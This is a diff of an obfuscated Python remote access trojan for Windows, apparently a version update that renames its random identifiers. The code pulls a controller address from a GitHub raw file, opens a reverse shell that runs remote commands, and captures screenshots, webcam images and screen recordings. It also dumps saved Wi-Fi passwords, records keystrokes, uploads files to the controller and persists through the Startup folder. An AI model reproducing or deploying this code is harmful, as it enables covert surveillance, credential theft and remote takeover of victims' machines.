@@ -1,74 +1,74 @@
 import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
 from datetime import datetime
-RMvecVjsm = ""
-lcnxijmaxBZpuZKZngl = ""
-cUUHEbBpnHrcvnzgWnwLxY = "01.06.26.0"
-lCEHHiVqgGvAfhINHslGhN = True
-zTwrDEFeBn = "!"
-zRhyyWAzPDRyqzKrhOU = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
-YqJBwZXPWfAkzglOif = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
-bRjcqUXwRnDeSR = os.path.expanduser("~\\AppData\\Local\\")
-ILVWnEkMyqEeGU = os.path.expanduser("~\\AppData\\Roaming\\")
-ciXFfixBfYmiHJ = ""
-def nEsOBLdIxApibEeeyW(host, port):
+fokSyzOGss = ""
+WQZMDQfXMTXmsyPMiLyA = ""
+gfUXizWTMFKQUNOMZSGp = "02.06.26.0"
+SELvZfuApuDSzCufJI = True
+IowLlPCzJbCkZuPx = "!"
+YCylGPCCa = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
+gcbKbalE = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
+exQXqQqpxDUANW = os.path.expanduser("~\\AppData\\Local\\")
+UmwzJLWXoVOygVz = os.path.expanduser("~\\AppData\\Roaming\\")
+YTJxfwLdnDXyLhhAlEVd = ""
+def HJAhdUm(host, port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((host, int(port) if port.isdecimal() else 5002))
 	return s
-def HCtSwCPWHYtYQCXNdrib(s):
+def ygSPZuUlDzwrHvCR(s):
 	data = s.recv(1024)
 	if len(data)==0:
 		return True
-	hqtIuNUgVvNwF = data.decode("utf-8").replace("\n","")
-	if not hqtIuNUgVvNwF.startswith(zTwrDEFeBn):
-		proc = subprocess.run(hqtIuNUgVvNwF, shell=True, capture_output=True)
-		AXgkSGGzVaSqnrfDZ = proc.stdout + proc.stderr
-		rrnEIYXoUbbu(s, AXgkSGGzVaSqnrfDZ)
+	LPbWTZrFbqtMnNJsA = data.decode("utf-8").replace("\n","")
+	if not LPbWTZrFbqtMnNJsA.startswith(IowLlPCzJbCkZuPx):
+		proc = subprocess.run(LPbWTZrFbqtMnNJsA, shell=True, capture_output=True)
+		XfCaMDiA = proc.stdout + proc.stderr
+		xucsXHfFUSSdC(s, XfCaMDiA)
 		return
-	TYwMPrdHvm = hqtIuNUgVvNwF.split(" ")[0][1:]
-	args = " ".join(hqtIuNUgVvNwF.split()[1:]).split()
-	if TYwMPrdHvm == "cd":
-		moveDirectory(s, hqtIuNUgVvNwF[4:])
-	elif TYwMPrdHvm == "screenshot":
-		WzomKOYMHh(s)
-	elif TYwMPrdHvm == "webcam":
-		ahqKXZUbW(s, args)
-	elif TYwMPrdHvm == "download":
-		iRtgAEENyppHzSe(s, hqtIuNUgVvNwF)
-	elif TYwMPrdHvm == "upload":
-		LvulznNkEjBuH(s, hqtIuNUgVvNwF)
-	elif TYwMPrdHvm == "wifi":
-		pADdeeLrGtGCt(s)
-	elif TYwMPrdHvm == "screenrecord":
-		sjcCuMCobZrgtehACc(s, args)
-	elif TYwMPrdHvm == "update":
-		wjFbWDXkubXtI(s)
-	elif TYwMPrdHvm == "basename":
-		rrnEIYXoUbbu(s, os.path.basename(__file__))
+	tIegNvgv = LPbWTZrFbqtMnNJsA.split(" ")[0][1:]
+	args = " ".join(LPbWTZrFbqtMnNJsA.split()[1:]).split()
+	if tIegNvgv == "cd":
+		moveDirectory(s, LPbWTZrFbqtMnNJsA[4:])
+	elif tIegNvgv == "screenshot":
+		RlVmDheeYQ(s)
+	elif tIegNvgv == "webcam":
+		iaEpjoUL(s, args)
+	elif tIegNvgv == "download":
+		LXwvzHVEb(s, LPbWTZrFbqtMnNJsA)
+	elif tIegNvgv == "upload":
+		tpVSyUbejjBfSYLLqWv(s, LPbWTZrFbqtMnNJsA)
+	elif tIegNvgv == "wifi":
+		fGrRulvm(s)
+	elif tIegNvgv == "screenrecord":
+		dVpcLMpofOZv(s, args)
+	elif tIegNvgv == "update":
+		jsVPcsfLCUqqoXb(s)
+	elif tIegNvgv == "basename":
+		xucsXHfFUSSdC(s, os.path.basename(__file__))
 	else:
-		rrnEIYXoUbbu(s,"")
+		xucsXHfFUSSdC(s,"")
 def moveDirectory(s, path):
 	try:
 		os.chdir(path)
-		rrnEIYXoUbbu(s,"")
+		xucsXHfFUSSdC(s,"")
 	except:
-		rrnEIYXoUbbu(s, "[!] 404")
-def iRtgAEENyppHzSe(s, hqtIuNUgVvNwF):
-	RjniyDWutIxjHfomYRWIt = hqtIuNUgVvNwF.replace(zTwrDEFeBn+"download ","").split(",")
-	AXgkSGGzVaSqnrfDZs = ""
-	for f in RjniyDWutIxjHfomYRWIt:
-		AXgkSGGzVaSqnrfDZs += GgMNNlqFidFi(f, "api/file/", { "type":os.path.splitext(f)[1] })
-	rrnEIYXoUbbu(s, AXgkSGGzVaSqnrfDZs)
-def WzomKOYMHh(s):
+		xucsXHfFUSSdC(s, "[!] 404")
+def LXwvzHVEb(s, LPbWTZrFbqtMnNJsA):
+	jDCbLAUdXPLmhJBNYzdtC = LPbWTZrFbqtMnNJsA.replace(IowLlPCzJbCkZuPx+"download ","").split(",")
+	XfCaMDiAs = ""
+	for f in jDCbLAUdXPLmhJBNYzdtC:
+		XfCaMDiAs += ZNZgkrThtQ(f, "api/file/", { "type":os.path.splitext(f)[1] })
+	xucsXHfFUSSdC(s, XfCaMDiAs)
+def RlVmDheeYQ(s):
 	from PIL import ImageGrab
 	image = ImageGrab.grab(bbox=None,
 		include_layered_windows=False,all_screens=True,xdisplay=None)
-	byXLMGYWMFOeJS = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
-	image.save(byXLMGYWMFOeJS)
+	itBMtQn = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
+	image.save(itBMtQn)
 	image.close()
-	AXgkSGGzVaSqnrfDZ = GgMNNlqFidFi(byXLMGYWMFOeJS, "api/sscap")
-	os.remove(byXLMGYWMFOeJS)
-	rrnEIYXoUbbu(s, AXgkSGGzVaSqnrfDZ)
-def ahqKXZUbW(s, args):
+	XfCaMDiA = ZNZgkrThtQ(itBMtQn, "api/sscap")
+	os.remove(itBMtQn)
+	xucsXHfFUSSdC(s, XfCaMDiA)
+def iaEpjoUL(s, args):
 	import cv2
 	cameraNumber = 0
 	fname = "wc.jpg"
@@ -78,178 +78,178 @@ def ahqKXZUbW(s, args):
 			except: pass
 		cam = cv2.VideoCapture(cameraNumber)
 		_, frame = cam.read()
-		cv2.imwrite(bRjcqUXwRnDeSR+fname, frame)
+		cv2.imwrite(exQXqQqpxDUANW+fname, frame)
 		cam.release()
-		r=GgMNNlqFidFi(bRjcqUXwRnDeSR+fname,"api/wc")
-		os.remove(bRjcqUXwRnDeSR+fname)
-		rrnEIYXoUbbu(s, r)
+		r=ZNZgkrThtQ(exQXqQqpxDUANW+fname,"api/wc")
+		os.remove(exQXqQqpxDUANW+fname)
+		xucsXHfFUSSdC(s, r)
 	except Exception as e:
-		rrnEIYXoUbbu(s, "[!] 404: "+str(e))
-def sjcCuMCobZrgtehACc(s, args):
+		xucsXHfFUSSdC(s, "[!] 404: "+str(e))
+def dVpcLMpofOZv(s, args):
 	import imageio
 	from PIL import ImageGrab
-	QLhDbjXNmfxeGPLwcRVq = 15
+	rSYCsEzqzjQr = 15
 	if not args == []:
-		try: QLhDbjXNmfxeGPLwcRVq = int(args[0])
+		try: rSYCsEzqzjQr = int(args[0])
 		except: pass
-	aUEJzUTBALdOT = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
-	LMyUqTOiIjqh = []
+	ChghLPrzVMmTXJopdKccTI = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
+	ovnIsaKUgRvsyTYTkgs = []
 	fps = 11
-	numFrames = QLhDbjXNmfxeGPLwcRVq * fps
+	numFrames = rSYCsEzqzjQr * fps
 	for _ in range(numFrames):
-		LMyUqTOiIjqh.append(ImageGrab.grab(bbox=None, all_screens=True))
-	imageio.mimsave(aUEJzUTBALdOT, LMyUqTOiIjqh, fps=fps, quality=8)
-	r=GgMNNlqFidFi(aUEJzUTBALdOT, "api/screc")
-	os.remove(aUEJzUTBALdOT)
-	rrnEIYXoUbbu(s, r)
-def GgMNNlqFidFi(whNRMND, cQMIhkvBADWa, yZMroSf=None):
+		ovnIsaKUgRvsyTYTkgs.append(ImageGrab.grab(bbox=None, all_screens=True))
+	imageio.mimsave(ChghLPrzVMmTXJopdKccTI, ovnIsaKUgRvsyTYTkgs, fps=fps, quality=8)
+	r=ZNZgkrThtQ(ChghLPrzVMmTXJopdKccTI, "api/screc")
+	os.remove(ChghLPrzVMmTXJopdKccTI)
+	xucsXHfFUSSdC(s, r)
+def ZNZgkrThtQ(frVNGfcOp, jNEdcCofia, FCWDryhWCtfo=None):
 	import requests
-	if not os.path.isfile(whNRMND):
-		return "[!] 404: "+whNRMND+"\n"
+	if not os.path.isfile(frVNGfcOp):
+		return "[!] 404: "+frVNGfcOp+"\n"
 	headers = {"user":os.getlogin()}
-	if yZMroSf is not None:
-		headers = {**headers, **yZMroSf}
-	f = open(whNRMND, "rb")
-	requests.post("http://"+RMvecVjsm+":5555/"+cQMIhkvBADWa,
+	if FCWDryhWCtfo is not None:
+		headers = {**headers, **FCWDryhWCtfo}
+	f = open(frVNGfcOp, "rb")
+	requests.post("http://"+fokSyzOGss+":5555/"+jNEdcCofia,
 		files={"file":f},
 		headers=headers)
 	f.close()
 	return "[+] 200"
-def LvulznNkEjBuH(s, hqtIuNUgVvNwF):
+def tpVSyUbejjBfSYLLqWv(s, LPbWTZrFbqtMnNJsA):
 	import requests
-	gkalChCoMp = hqtIuNUgVvNwF.split(" ")[-1]
-	aspwFvqciqNlSyP = hqtIuNUgVvNwF.replace(zTwrDEFeBn+"upload ","").replace(" "+gkalChCoMp,"")
-	if os.path.exists(aspwFvqciqNlSyP) or os.path.isfile(aspwFvqciqNlSyP):
-		rrnEIYXoUbbu(s, "[!] 409")
+	qOTYMocZFhiivuwIwp = LPbWTZrFbqtMnNJsA.split(" ")[-1]
+	OJBPAEIlAnyywkB = LPbWTZrFbqtMnNJsA.replace(IowLlPCzJbCkZuPx+"upload ","").replace(" "+qOTYMocZFhiivuwIwp,"")
+	if os.path.exists(OJBPAEIlAnyywkB) or os.path.isfile(OJBPAEIlAnyywkB):
+		xucsXHfFUSSdC(s, "[!] 409")
 		return
-	response = requests.get(f"http://{RMvecVjsm}:5555/api/content/{gkalChCoMp}", headers={"auth":"981xyz"})
+	response = requests.get(f"http://{fokSyzOGss}:5555/api/content/{qOTYMocZFhiivuwIwp}", headers={"auth":"981xyz"})
 	if response.status_code != 200:
-		rrnEIYXoUbbu(s, "[!] 404")
+		xucsXHfFUSSdC(s, "[!] 404")
 		return
-	with open(aspwFvqciqNlSyP, "wb") as f:
+	with open(OJBPAEIlAnyywkB, "wb") as f:
 		f.write(response.content)
-	rrnEIYXoUbbu(s, "[+] 200")
-def IIAzRBiuoRuzXgfKMM(DjHshANEXemohyOhkq, cQMIhkvBADWa):
+	xucsXHfFUSSdC(s, "[+] 200")
+def NyRpCRFTqhVVUkJUnthRq(dCsfeRJCKclduMsfez, jNEdcCofia):
 	import requests
-	if DjHshANEXemohyOhkq.strip() == "":
+	if dCsfeRJCKclduMsfez.strip() == "":
 		return "[!] 204"
-	requests.post("http://"+RMvecVjsm+":5555/"+cQMIhkvBADWa,
-		data=DjHshANEXemohyOhkq,
+	requests.post("http://"+fokSyzOGss+":5555/"+jNEdcCofia,
+		data=dCsfeRJCKclduMsfez,
 		headers={"user":os.getlogin()})
 	return "[+] 200"
-def wjFbWDXkubXtI(s):
-	h, p, v = fOCsLZpoJFoXHfiX(True)
-	if (v != cUUHEbBpnHrcvnzgWnwLxY):
-		LkNSJMG(v)
-		rrnEIYXoUbbu(s, "[+] 200")
+def jsVPcsfLCUqqoXb(s):
+	h, p, v = XAtWTZCQuxUnYFRTZ(True)
+	if (v != gfUXizWTMFKQUNOMZSGp):
+		XxAmfHTqqakHsAniUqUJe(v)
+		xucsXHfFUSSdC(s, "[+] 200")
 	else:
-		rrnEIYXoUbbu(s, "[-] 304")
-def pADdeeLrGtGCt(s):
+		xucsXHfFUSSdC(s, "[-] 304")
+def fGrRulvm(s):
 	try:
 		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
 	except:
-		rrnEIYXoUbbu(s, "[!] 500")
+		xucsXHfFUSSdC(s, "[!] 500")
 		return
-	QupJcrXINQQh = ""
+	FIyUuNzybJWgY = ""
 	for p in profiles:
-		try: QupJcrXINQQh+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
-		except: QupJcrXINQQh+=f"    {p} - N/A"
-	rrnEIYXoUbbu(s, QupJcrXINQQh)
-def LkNSJMG(QYcZrtmYpFYvwSGIKBXYPRq):
+		try: FIyUuNzybJWgY+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
+		except: FIyUuNzybJWgY+=f"    {p} - N/A"
+	xucsXHfFUSSdC(s, FIyUuNzybJWgY)
+def XxAmfHTqqakHsAniUqUJe(RmJsYElNZBsTLH):
 	import requests, sys
-	global lCEHHiVqgGvAfhINHslGhN
+	global SELvZfuApuDSzCufJI
 	name, ext = os.path.splitext(os.path.basename(sys.executable if getattr(sys, "frozen", False) else __file__))
 	py = ext.startswith(".py")
-	file = f"{name}.{QYcZrtmYpFYvwSGIKBXYPRq}.{'pyw' if py else 'exe'}"
+	file = f"{name}.{RmJsYElNZBsTLH}.{'pyw' if py else 'exe'}"
 	course = f"file.{'pyw' if py else 'exe'}"
 	path = os.path.join(os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"), file)
 	if not os.path.isfile(path):
-		r = requests.get(YqJBwZXPWfAkzglOif + source)
+		r = requests.get(gcbKbalE + source)
 		with open(path, "w" if py else "wb") as f:
-			f.write(r.text if py else r content)
+			f.write(r.text if py else r.content)
 	else:
-		lCEHHiVqgGvAfhINHslGhN = False
-def fOCsLZpoJFoXHfiX(force=False):
-	global RMvecVjsm, lcnxijmaxBZpuZKZngl
-	if force or RMvecVjsm == "" or lcnxijmaxBZpuZKZngl == "":
+		SELvZfuApuDSzCufJI = False
+def XAtWTZCQuxUnYFRTZ(force=False):
+	global fokSyzOGss, WQZMDQfXMTXmsyPMiLyA
+	if force or fokSyzOGss == "" or WQZMDQfXMTXmsyPMiLyA == "":
 		while True:
 			try:
-				with urllib.request.urlopen(zRhyyWAzPDRyqzKrhOU) as response:
+				with urllib.request.urlopen(YCylGPCCa) as response:
 					data = response.read().decode("utf-8").replace("\n","").split(":")
-					RMvecVjsm = data[0].strip()
-					lcnxijmaxBZpuZKZngl = data[1].strip()
-					QYcZrtmYpFYvwSGIKBXYPRq = data[2].strip()
-					return RMvecVjsm, lcnxijmaxBZpuZKZngl, QYcZrtmYpFYvwSGIKBXYPRq
+					fokSyzOGss = data[0].strip()
+					WQZMDQfXMTXmsyPMiLyA = data[1].strip()
+					RmJsYElNZBsTLH = data[2].strip()
+					return fokSyzOGss, WQZMDQfXMTXmsyPMiLyA, RmJsYElNZBsTLH
 			except:
 				time.sleep(10)
-def czBhSwwW():
+def ngkkNGUbJZTe():
 	try:
-		pPeXloFfMAyKF = "settings.xpb"
-		YpojHtPcxpVHbDOGeTH = sorted([file for file in os.listdir(bRjcqUXwRnDeSR) if os.path.isfile(bRjcqUXwRnDeSR+"\\"+file) and file.endswith(pPeXloFfMAyKF.split(".")[-1])])
-		if pPeXloFfMAyKF in YpojHtPcxpVHbDOGeTH:
-			YpojHtPcxpVHbDOGeTH.remove(pPeXloFfMAyKF)
-		CqUjUjiPWpgATC = os.path.join(bRjcqUXwRnDeSR,pPeXloFfMAyKF)
-		if len(YpojHtPcxpVHbDOGeTH) > 0:
-			with open(CqUjUjiPWpgATC, "ab+") as f:
-				for file in YpojHtPcxpVHbDOGeTH:
-					temp = os.path.join(bRjcqUXwRnDeSR,file)
+		KPlsImMxWsinEcn = "settings.xpb"
+		ZffBdxBqygdLRAvaId = sorted([file for file in os.listdir(exQXqQqpxDUANW) if os.path.isfile(exQXqQqpxDUANW+"\\"+file) and file.endswith(KPlsImMxWsinEcn.split(".")[-1])])
+		if KPlsImMxWsinEcn in ZffBdxBqygdLRAvaId:
+			ZffBdxBqygdLRAvaId.remove(KPlsImMxWsinEcn)
+		fSjpbJppTJOhFoOcYXNcE = os.path.join(exQXqQqpxDUANW,KPlsImMxWsinEcn)
+		if len(ZffBdxBqygdLRAvaId) > 0:
+			with open(fSjpbJppTJOhFoOcYXNcE, "ab+") as f:
+				for file in ZffBdxBqygdLRAvaId:
+					temp = os.path.join(exQXqQqpxDUANW,file)
 					with open(temp,"rb") as tf:
 						f.write(tf.read())
 					os.remove(temp)
-		GgMNNlqFidFi(CqUjUjiPWpgATC, "api/log")
-		if os.path.isfile(CqUjUjiPWpgATC):
-			os.remove(CqUjUjiPWpgATC)
+		ZNZgkrThtQ(fSjpbJppTJOhFoOcYXNcE, "api/log")
+		if os.path.isfile(fSjpbJppTJOhFoOcYXNcE):
+			os.remove(fSjpbJppTJOhFoOcYXNcE)
 	except:
 		pass
-def uIszTPVAp():
+def comAKXecSwQSIooXAXRf():
 	from pynput.keyboard import Listener
 	import logging
-	logging.basicConfig(filename=(bRjcqUXwRnDeSR+str(datetime.today().strftime("%d")) + ".xpb"),
+	logging.basicConfig(filename=(exQXqQqpxDUANW+str(datetime.today().strftime("%d")) + ".xpb"),
 		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
-	def SBklTQwlmgNjXGGF(k):
+	def JOMyWYDtjmB(k):
 		logging.info(str(k))
-	k=Listener(on_press=SBklTQwlmgNjXGGF)
-	KjOFgJcnSTqBRHdS = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
-	for l in KjOFgJcnSTqBRHdS:
+	k=Listener(on_press=JOMyWYDtjmB)
+	gxUPQfXNzO = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
+	for l in gxUPQfXNzO:
 		l.setLevel(logging.CRITICAL)
 	k.start()
-def rrnEIYXoUbbu(clientSocket, DjHshANEXemohyOhkq):
+def xucsXHfFUSSdC(clientSocket, dCsfeRJCKclduMsfez):
 	formattedData = b""
-	if type(DjHshANEXemohyOhkq) == bytes:
-		formattedData += DjHshANEXemohyOhkq
+	if type(dCsfeRJCKclduMsfez) == bytes:
+		formattedData += dCsfeRJCKclduMsfez
 	else:
-		formattedData += bytes(DjHshANEXemohyOhkq, "utf-8")
-	formattedData += bytes("\n"+ciXFfixBfYmiHJ+os.getcwd().replace("\\","/")+" >> ", "utf-8")
+		formattedData += bytes(dCsfeRJCKclduMsfez, "utf-8")
+	formattedData += bytes("\n"+YTJxfwLdnDXyLhhAlEVd+os.getcwd().replace("\\","/")+" >> ", "utf-8")
 	clientSocket.sendall(formattedData)
-def HhTadHqfLEKfiEOXYKAAFcZ():
-	global ciXFfixBfYmiHJ
-	h, p, v = fOCsLZpoJFoXHfiX()
-	try: czBhSwwW()
+def nwfvcCwSzotg():
+	global YTJxfwLdnDXyLhhAlEVd
+	h, p, v = XAtWTZCQuxUnYFRTZ()
+	try: ngkkNGUbJZTe()
 	except: pass
 	try:
-		if cUUHEbBpnHrcvnzgWnwLxY != v:
-			LkNSJMG(v)
+		if gfUXizWTMFKQUNOMZSGp != v:
+			XxAmfHTqqakHsAniUqUJe(v)
 	except: pass
 	try:
-		if lCEHHiVqgGvAfhINHslGhN:
-			uIszTPVAp()
+		if SELvZfuApuDSzCufJI:
+			comAKXecSwQSIooXAXRf()
 		pass
 	except:
 		pass
 	try: os.chdir(os.path.expanduser("~"))
 	except: pass
-	ciXFfixBfYmiHJ = ("(old)"if cUUHEbBpnHrcvnzgWnwLxY!=v else "")+"["+cUUHEbBpnHrcvnzgWnwLxY+"] "+os.getlogin()+" - "
+	YTJxfwLdnDXyLhhAlEVd = ("(old)"if gfUXizWTMFKQUNOMZSGp!=v else "")+"["+gfUXizWTMFKQUNOMZSGp+"] "+os.getlogin()+" - "
 	while True:
-		kcFWzwAjHBgs=False
+		BOWSzJDxMkTDfhMKcqY=False
 		try:
-			s=nEsOBLdIxApibEeeyW(h, p)
-			rrnEIYXoUbbu(s, "")
-			while not kcFWzwAjHBgs:
-				try: kcFWzwAjHBgs=HCtSwCPWHYtYQCXNdrib(s)
+			s=HJAhdUm(h, p)
+			xucsXHfFUSSdC(s, "")
+			while not BOWSzJDxMkTDfhMKcqY:
+				try: BOWSzJDxMkTDfhMKcqY=ygSPZuUlDzwrHvCR(s)
 				except Exception as e:
-					rrnEIYXoUbbu(s, str(e))
+					xucsXHfFUSSdC(s, str(e))
 			s.close()
 		except:
 			pass
 		time.sleep(5)
-HhTadHqfLEKfiEOXYKAAFcZ()
+nwfvcCwSzotg()
